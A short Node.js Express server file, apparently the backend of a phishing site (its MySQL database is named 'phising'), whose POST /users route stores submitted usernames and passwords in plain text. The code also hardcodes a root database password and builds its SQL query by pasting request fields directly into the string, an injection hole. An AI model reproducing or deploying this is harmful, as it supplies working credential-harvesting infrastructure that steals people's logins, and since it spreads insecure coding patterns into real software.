var express = require("express")
const cors = require("cors")
const app = express()
app.use(express.json())
app.use(cors())


var mysql = require("mysql")
var connection = mysql.createConnection({
    host: "localhost",
    user: "root",
    password:"Ib21666125",
    database: "phising", 
    port: "3306"
})

connection.connect(err=>{
    if(err){
        console.log(err)
    }else{
        console.log("dB connected")

        // let sql = "INSERT INTO users(id, username, password) VALUES (2, 'mascuud', '00888')"
        // connection.query(sql, (err)=>{
        //     console.log(err)
        // })

    }
})

app.post("/users", (req, res)=>{
    console.log(req.body)

    let sql = `INSERT INTO ardi( username, password) VALUES ('${req.body.username}', '${req.body.password}')`
        connection.query(sql, (err)=>{
            console.log(err)
        })
})
const PORT= process.env.PORT || 5000

app.listen(PORT);
